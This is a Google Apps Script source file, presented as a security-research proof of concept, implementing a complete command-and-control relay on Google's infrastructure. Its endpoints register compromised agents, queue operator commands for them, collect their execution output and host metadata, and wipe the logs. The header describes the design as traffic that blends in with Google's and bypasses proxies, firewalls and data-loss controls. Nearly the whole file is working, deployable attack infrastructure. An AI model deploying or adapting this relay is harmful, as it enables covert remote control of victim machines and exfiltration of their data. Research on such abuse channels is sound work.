/**
 * Google Apps Script C2 Redirector — PoC
 * =======================================
 * Security Research
 *
 * PURPOSE: Demonstrate that Google Apps Script can be weaponized as a
 *          fully functional, bidirectional C2 channel running entirely
 *          on Google's own infrastructure (script.google.com).
 *
 * IMPACT:  - C2 traffic is indistinguishable from legitimate Google traffic
 *          - Bypasses enterprise proxies, firewalls, and DLP solutions
 *          - Zero external infrastructure required
 *          - No authentication needed for public Web App deployments
 *
 * AUTHOR:  Kelyan Yesil
 */

// ─── CONFIGURATION ────────────────────────────────────────────────────────────

const CONFIG = {
  SHEET_ID:       "YOUR_SHEET_ID_HERE",   // Google Sheet ID (from URL — replace before deploying)
  SHEETS: {
    AGENTS:       "Agents",               // Registered agents
    COMMANDS:     "Commands",             // Command queue
    RESULTS:      "Results",              // Execution results
    LOGS:         "Logs",                 // Activity log
  },
  MAX_OUTPUT_LEN: 10000,                  // Truncate large outputs
  VERSION:        "1.1.0",
  TOKEN:          "gas-c2-vrp-2026",   // Shared secret — required on attacker endpoints
  // Note: XOR payload obfuscation is done client-side (agent + panel). GAS acts as dumb relay.
};

// ─── ENTRY POINTS ─────────────────────────────────────────────────────────────

/**
 * doGet — handles agent check-in and command polling.
 * Accessible at: https://script.google.com/macros/s/<ID>/exec?action=poll&agent_id=<ID>
 */
function doGet(e) {
  try {
    const action   = (e.parameter.action || "poll").toLowerCase();
    const agent_id = e.parameter.agent_id || null;

    logActivity("GET", action, agent_id);

    switch (action) {
      case "poll":     return handlePoll(agent_id);
      case "register": return handleRegister(e);
      case "status":   return handleStatus(e);
      case "queue":    return handleQueue(e);
      case "results":  return handleResults(e);
      case "agents":   return handleAgents(e);
      case "reset":    return handleReset(e);
      default:
        return jsonResponse({ error: "unknown_action", action });
    }
  } catch (err) {
    return jsonResponse({ error: "internal_error", message: err.message });
  }
}

/**
 * doPost — handles result submission from agents.
 * Body: { agent_id, cmd_id, output, metadata }
 */
function doPost(e) {
  try {
    const body = JSON.parse(e.postData.contents);
    logActivity("POST", "result", body.agent_id);
    return handleResult(body);
  } catch (err) {
    return jsonResponse({ error: "parse_error", message: err.message });
  }
}

// ─── HANDLERS ─────────────────────────────────────────────────────────────────

/**
 * handlePoll — returns the next pending command for the given agent.
 * Commands targeted at "*" are broadcast to all agents.
 */
function handlePoll(agent_id) {
  if (!agent_id) {
    return jsonResponse({ error: "agent_id required" });
  }

  updateAgentLastSeen(agent_id);

  const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName(CONFIG.SHEETS.COMMANDS);
  const rows  = sheet.getDataRange().getValues();

  // Skip header row; columns: [id, target, command, status, created_at]
  for (let i = 1; i < rows.length; i++) {
    const [id, target, command, status] = rows[i];

    const isTarget = (target === agent_id || target === "*");
    if (isTarget && status === "pending") {
      // Optimistic lock — mark as "sent" to prevent double-delivery
      sheet.getRange(i + 1, 4).setValue("sent");
      sheet.getRange(i + 1, 5).setValue(new Date().toISOString());

      return jsonResponse({
        cmd_id:   String(id),
        command:  command,
        target:   target,
        issued:   rows[i][4] || "",
      });
    }
  }

  return jsonResponse({ cmd_id: null, command: null });
}

/**
 * handleResult — stores the command output from an agent.
 */
function handleResult(body) {
  const { agent_id, cmd_id, output, metadata } = body;

  if (!agent_id || !cmd_id) {
    return jsonResponse({ error: "agent_id and cmd_id are required" });
  }

  const truncated = String(output || "").slice(0, CONFIG.MAX_OUTPUT_LEN);

  const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName(CONFIG.SHEETS.RESULTS);

  sheet.appendRow([
    new Date().toISOString(),
    agent_id,
    cmd_id,
    truncated,
    JSON.stringify(metadata || {}),
  ]);

  markCommandDone(cmd_id);

  return jsonResponse({ status: "ok", received: truncated.length });
}

/**
 * handleRegister — first-time agent registration with system metadata.
 */
function handleRegister(e) {
  const { agent_id, metadata } = e.parameter;

  if (!agent_id) return jsonResponse({ error: "agent_id required" });

  const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName(CONFIG.SHEETS.AGENTS);
  const rows  = sheet.getDataRange().getValues();

  // Check if already registered
  for (let i = 1; i < rows.length; i++) {
    if (rows[i][0] === agent_id) {
      sheet.getRange(i + 1, 3).setValue(new Date().toISOString()); // update last_seen
      return jsonResponse({ status: "already_registered" });
    }
  }

  sheet.appendRow([
    agent_id,
    new Date().toISOString(),    // registered_at
    new Date().toISOString(),    // last_seen
    metadata || "{}",
    "active",
  ]);

  return jsonResponse({ status: "registered", agent_id });
}

/**
 * handleStatus — returns aggregate C2 stats (for attacker panel).
 * Token-protected: only the operator panel should call this.
 */
function handleStatus(e) {
  if (!checkToken(e)) return jsonResponse({ error: "unauthorized" });

  const ss = SpreadsheetApp.openById(CONFIG.SHEET_ID);

  const agents   = ss.getSheetByName(CONFIG.SHEETS.AGENTS).getLastRow() - 1;
  const commands = ss.getSheetByName(CONFIG.SHEETS.COMMANDS).getLastRow() - 1;
  const results  = ss.getSheetByName(CONFIG.SHEETS.RESULTS).getLastRow() - 1;

  return jsonResponse({
    status:    "online",
    version:   CONFIG.VERSION,
    agents:    Math.max(0, agents),
    commands:  Math.max(0, commands),
    results:   Math.max(0, results),
    timestamp: new Date().toISOString(),
  });
}

/**
 * handleResults — returns the last N result rows, optionally filtered by agent_id.
 * Called by the panel for live feed: ?action=results&token=<TOKEN>[&agent_id=<id>][&limit=50]
 * Outputs are XOR-obfuscated by the agent; panel decrypts client-side.
 */
function handleResults(e) {
  if (!checkToken(e)) return jsonResponse({ error: "unauthorized" });

  const agent_id = e.parameter.agent_id || null;
  const limit    = Math.min(parseInt(e.parameter.limit) || 50, 200);

  const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName(CONFIG.SHEETS.RESULTS);
  const rows  = sheet.getDataRange().getValues();

  let data = rows.slice(1); // skip header
  if (agent_id && agent_id !== "*") {
    data = data.filter(r => String(r[1]) === agent_id);
  }
  data = data.slice(-limit); // last N rows

  const results = data.map(r => ({
    timestamp: String(r[0]),
    agent_id:  String(r[1]),
    cmd_id:    String(r[2]),
    output:    String(r[3]),
    metadata:  r[4] || "{}",
  }));

  return jsonResponse({ results, count: results.length });
}

/**
 * handleAgents — returns all registered agents with live/inactive status.
 * Marks agents as inactive if last_seen > 2 minutes ago.
 */
function handleAgents(e) {
  if (!checkToken(e)) return jsonResponse({ error: "unauthorized" });

  const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName(CONFIG.SHEETS.AGENTS);
  const rows  = sheet.getDataRange().getValues();

  const now   = Date.now();
  const STALE = 2 * 60 * 1000; // 2 minutes = inactive threshold

  const agentList = [];
  for (let i = 1; i < rows.length; i++) {
    const [agent_id, registered_at, last_seen, metadata, status] = rows[i];
    if (!agent_id || String(agent_id).trim() === "") continue; // skip empty/ghost rows
    const lastMs = new Date(String(last_seen)).getTime();
    const active = (now - lastMs) < STALE;
    const newStatus = active ? "active" : "inactive";

    if (String(status) !== newStatus) {
      sheet.getRange(i + 1, 5).setValue(newStatus);
    }

    let meta = {};
    try { meta = JSON.parse(String(metadata)); } catch (_) {}

    agentList.push({
      agent_id:      String(agent_id),
      registered_at: String(registered_at),
      last_seen:     String(last_seen),
      status:        newStatus,
      host:          meta.host || meta.computername || "",
      user:          meta.user || "",
      ip:            meta.ip   || "",
      os:            meta.os   || "",
    });
  }

  return jsonResponse({ agents: agentList, count: agentList.length });
}

/**
 * handleQueue — attacker writes a command to the Commands sheet via the web app.
 * Called by the panel with: ?action=queue&token=<TOKEN>&cmd_id=<id>&target=<target>&command=<cmd>
 * Commands are XOR-obfuscated by the panel before being sent here.
 */
function handleQueue(e) {
  if (!checkToken(e)) return jsonResponse({ error: "unauthorized" });

  const cmd_id  = e.parameter.cmd_id  || String(Date.now());
  const target  = e.parameter.target  || "*";
  const command = e.parameter.command || "";

  if (!command) {
    return jsonResponse({ error: "command is required" });
  }

  const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName(CONFIG.SHEETS.COMMANDS);

  sheet.appendRow([cmd_id, target, command, "pending", new Date().toISOString()]);
  logActivity("GET", `queue:${command}`, target);

  return jsonResponse({ status: "queued", cmd_id, target, command });
}

/**
 * handleReset — wipes all data rows from every sheet, keeping headers intact.
 * Token-protected. Returns counts of deleted rows per sheet.
 */
function handleReset(e) {
  if (!checkToken(e)) return jsonResponse({ error: "unauthorized" });

  const ss      = SpreadsheetApp.openById(CONFIG.SHEET_ID);
  const deleted = {};

  for (const name of Object.values(CONFIG.SHEETS)) {
    const sheet   = ss.getSheetByName(name);
    const lastRow = sheet.getLastRow();
    if (lastRow > 1) {
      // Clear content first, then delete rows to avoid ghost rows with formatting
      sheet.getRange(2, 1, lastRow - 1, sheet.getLastColumn()).clearContent();
      sheet.deleteRows(2, lastRow - 1);
      deleted[name] = lastRow - 1;
    } else {
      deleted[name] = 0;
    }
  }

  // Flush all pending writes before responding
  SpreadsheetApp.flush();

  logActivity("GET", "reset", "operator");
  return jsonResponse({ status: "reset_ok", deleted, timestamp: new Date().toISOString() });
}

// ─── HELPERS ──────────────────────────────────────────────────────────────────

/**
 * checkToken — validates the shared secret on attacker-facing endpoints.
 * If CONFIG.TOKEN is empty, auth is disabled (useful for local testing).
 */
function checkToken(e) {
  if (!CONFIG.TOKEN) return true;
  return (e && e.parameter && e.parameter.token) === CONFIG.TOKEN;
}

function markCommandDone(cmd_id) {
  const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
  const sheet = ss.getSheetByName(CONFIG.SHEETS.COMMANDS);
  const rows  = sheet.getDataRange().getValues();

  for (let i = 1; i < rows.length; i++) {
    if (String(rows[i][0]) === String(cmd_id)) {
      sheet.getRange(i + 1, 4).setValue("done");
      sheet.getRange(i + 1, 5).setValue(new Date().toISOString());
      break;
    }
  }
}

function updateAgentLastSeen(agent_id) {
  try {
    const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
    const sheet = ss.getSheetByName(CONFIG.SHEETS.AGENTS);
    const rows  = sheet.getDataRange().getValues();

    for (let i = 1; i < rows.length; i++) {
      if (rows[i][0] === agent_id) {
        sheet.getRange(i + 1, 3).setValue(new Date().toISOString());
        return;
      }
    }
  } catch (_) {
    // Non-critical — ignore
  }
}

function logActivity(method, action, agent_id) {
  try {
    const ss    = SpreadsheetApp.openById(CONFIG.SHEET_ID);
    const sheet = ss.getSheetByName(CONFIG.SHEETS.LOGS);
    sheet.appendRow([new Date().toISOString(), method, action, agent_id || "-"]);
  } catch (_) {
    // Non-critical — ignore
  }
}

function jsonResponse(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

// ─── SETUP FUNCTION (run once manually) ──────────────────────────────────────

/**
 * setupSheets — initializes all required sheets with headers.
 * Run this ONCE from the Apps Script editor before deploying.
 */
function setupSheets() {
  const ss = SpreadsheetApp.openById(CONFIG.SHEET_ID);

  const schemas = {
    [CONFIG.SHEETS.AGENTS]:   ["agent_id", "registered_at", "last_seen", "metadata", "status"],
    [CONFIG.SHEETS.COMMANDS]: ["id", "target", "command", "status", "timestamp"],
    [CONFIG.SHEETS.RESULTS]:  ["timestamp", "agent_id", "cmd_id", "output", "metadata"],
    [CONFIG.SHEETS.LOGS]:     ["timestamp", "method", "action", "agent_id"],
  };

  for (const [name, headers] of Object.entries(schemas)) {
    let sheet = ss.getSheetByName(name);
    if (!sheet) sheet = ss.insertSheet(name);

    // Write header row only if sheet is empty
    if (sheet.getLastRow() === 0) {
      sheet.appendRow(headers);
      sheet.getRange(1, 1, 1, headers.length).setFontWeight("bold");
    }
  }

  Logger.log("Setup complete. Sheets initialized.");
}
